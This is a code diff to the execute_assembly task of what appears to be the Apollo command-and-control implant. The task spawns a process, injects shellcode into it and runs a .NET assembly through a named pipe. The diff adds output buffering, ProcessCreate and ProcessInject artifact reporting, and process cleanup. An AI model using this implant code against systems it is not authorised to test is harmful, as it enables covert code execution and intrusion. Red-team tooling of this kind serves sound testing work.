@@ -13,6 +13,7 @@ using System.Collections.Concurrent;
 using System.IO.Pipes;
 using ApolloInterop.Structs.ApolloStructs;
 using ApolloInterop.Classes.Core;
+using ApolloInterop.Classes.Collections;
 
 namespace Tasks
 {
@@ -38,6 +39,10 @@ namespace Tasks
         private AutoResetEvent _complete = new AutoResetEvent(false);
         private Action<object> _sendAction;
 
+        private AutoResetEvent _timerFlush = new AutoResetEvent(false);
+        private Action<object> _flushMessages;
+        private ThreadSafeList<string> _assemblyOutput = new ThreadSafeList<string>();
+        private bool _completed = false;
         public execute_assembly(IAgent agent, Task task) : base(agent, task)
         {
             _sendAction = (object p) =>
@@ -56,6 +61,38 @@ namespace Tasks
                     }
                 }
                 _complete.Set();
+            };
+
+            _flushMessages = (object p) =>
+            {
+                string output = "";
+                while(!_cancellationToken.IsCancellationRequested && !_completed)
+                {
+                    WaitHandle.WaitAny(new WaitHandle[]
+                    {
+                        _complete,
+                        _timerFlush,
+                        _cancellationToken.Token.WaitHandle
+                    }, 1000);
+                    output = string.Join("", _assemblyOutput.Flush());
+                    if (!string.IsNullOrEmpty(output))
+                    {
+                        _agent.GetTaskManager().AddTaskResponseToQueue(
+                            CreateTaskResponse(
+                                output,
+                                false,
+                                ""));
+                    }
+                }
+                output = string.Join("", _assemblyOutput.Flush());
+                if (!string.IsNullOrEmpty(output))
+                {
+                    _agent.GetTaskManager().AddTaskResponseToQueue(
+                        CreateTaskResponse(
+                            output,
+                            false,
+                            ""));
+                }
             };
         }
 
@@ -92,8 +129,35 @@ namespace Tasks
                                 proc = _agent.GetProcessManager().NewProcess(info.Application, info.Arguments, true);
                                 if (proc.Start())
                                 {
+                                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
+                                        "",
+                                        false,
+                                        "",
+                                        new IMythicMessage[]
+                                        {
+                                            new Artifact
+                                            {
+                                                BaseArtifact = "ProcessCreate",
+                                                ArtifactDetails = string.IsNullOrEmpty(info.Arguments) ?
+                                                $"Started {info.Application} (PID: {proc.PID})" : 
+                                                $"Started {info.Application} {info.Arguments} (PID: {proc.PID})"
+                                            }
+                                        }
+                                    ));
                                     if (proc.Inject(exeAsmPic))
                                     {
+                                        _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
+                                            "",
+                                            false,
+                                            "",
+                                            new IMythicMessage[]
+                                            {
+                                                new Artifact
+                                                {
+                                                    BaseArtifact = "ProcessInject",
+                                                    ArtifactDetails = $"Injected into PID {proc.PID} using {_agent.GetInjectionManager().GetCurrentTechnique().Name}"
+                                                }
+                                            }));
                                         IPCCommandArguments cmdargs = new IPCCommandArguments
                                         {
                                             ByteData = assemblyBytes,
@@ -112,7 +176,8 @@ namespace Tasks
                                             }
                                             _senderEvent.Set();
                                             _complete.WaitOne();
-                                            resp = CreateTaskResponse("", true);
+                                            _completed = true;
+                                            resp = CreateTaskResponse("", true, "completed");
                                         } else
                                         {
                                             resp = CreateTaskResponse($"Failed to connect to named pipe.", true, "error");
@@ -148,6 +213,10 @@ namespace Tasks
                     resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
                 }
                 _agent.GetTaskManager().AddTaskResponseToQueue(resp);
+                if (!proc.HasExited)
+                {
+                    proc.Kill();
+                }
             }, _cancellationToken.Token);
         }
 
@@ -161,6 +230,7 @@ namespace Tasks
         private void Client_ConnectionEstablished(object sender, NamedPipeMessageArgs e)
         {
             System.Threading.Tasks.Task.Factory.StartNew(_sendAction, e.Pipe, _cts.Token);
+            System.Threading.Tasks.Task.Factory.StartNew(_flushMessages, _cts.Token);
         }
 
         public void OnAsyncMessageSent(IAsyncResult result)
@@ -178,10 +248,7 @@ namespace Tasks
         {
             IPCData d = e.Data;
             string msg = Encoding.UTF8.GetString(d.Data.Take(d.DataLength).ToArray());
-            _agent.GetTaskManager().AddTaskResponseToQueue(
-                CreateTaskResponse(
-                    msg,
-                    false));
+            _assemblyOutput.Add(msg);
         }
     }
 }
